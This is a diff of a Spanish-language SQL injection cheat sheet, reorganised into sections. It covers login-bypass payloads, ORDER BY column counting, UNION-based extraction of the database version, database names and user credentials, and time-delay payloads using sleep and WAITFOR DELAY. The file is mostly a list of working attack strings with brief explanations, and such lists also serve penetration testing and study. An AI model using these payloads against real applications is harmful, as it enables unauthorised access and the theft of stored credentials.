@@ -1,3 +1,6 @@
+
+### 1-Login inyection
+Estos payloads hacen referencia inyeciones de consultas de sql, tambien se pueden usar en los logins para conseguir el usuario de administrador generalmente.
 ```bash
 root' --
 root' #
@@ -99,20 +102,29 @@ admin") or "1"="1
 admin") or "1"="1"--
 admin") or "1"="1"#
 admin") or "1"="1"/*
+```
+------------------------------------------
+### 2- Determinar el número de columnas necesarias en un ataque UNION de inyección SQL
+```sql
+' ORDER BY 1--
+```
+Podemos ir testeando este payload para determinar cuantas columnas necesitamos. Ej: si con el payload del numero 3 significa que
+la posición ORDER BY número 3 está fuera del rango del número de elementos en la lista de selección.
+
+```sql
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+etc ...
+```
 
 ------------------------------------------
-')) or sleep(5)='
-' WAITFOR DELAY '0:0:5'--
-';WAITFOR DELAY '0:0:5'-- 
-;waitfor delay '0:0:5'--
-);waitfor delay '0:0:5'--
-';waitfor delay '0:0:5'--
-";waitfor delay '0:0:5'--
-');waitfor delay '0:0:5'--
-");waitfor delay '0:0:5'--
-));waitfor delay '0:0:5'--
-
-------------------------------------------
+### 3- SQL injection UNION attacks
+```sql
+SELECT A, B FROM table1 UNION SELECT C, D FROM table2
+```
+Esta consulta SQL devolverá un único conjunto de resultados con dos columnas, que contienen los valores de las columnas A y B en la tabla1 y las columnas C y D en la tabla2.
+```sql
 union select 1,2-- -
 union select 1,@@version
 union select all 1,database()
@@ -131,9 +143,27 @@ union select 1,(select group_concat(username,password) from sysadmin.users)
 ' UNION SELECT NULL,NULL--
 ' UNION SELECT NULL,NULL,NULL--
 etc ...
-------------------------------------------
-' ORDER BY 1--
-' ORDER BY 2--
-' ORDER BY 3--
-etc ...
 ```
+------------------------------------------
+### 4- Time delays
+Los Time Delays crean un tiempo de espera al recibir la peticion cuando se ejecutan.
+
+Delay de 5 segundos:
+```sql
+')) or sleep(5)='
+```
+Estos payloads se usan para testear si existe una inyeccion SQL porque no suponen un riesgo para la base de datos.
+
+```sql
+')) or sleep(5)='
+' WAITFOR DELAY '0:0:5'--
+';WAITFOR DELAY '0:0:5'-- 
+;waitfor delay '0:0:5'--
+);waitfor delay '0:0:5'--
+';waitfor delay '0:0:5'--
+";waitfor delay '0:0:5'--
+');waitfor delay '0:0:5'--
+");waitfor delay '0:0:5'--
+));waitfor delay '0:0:5'--
+```
+
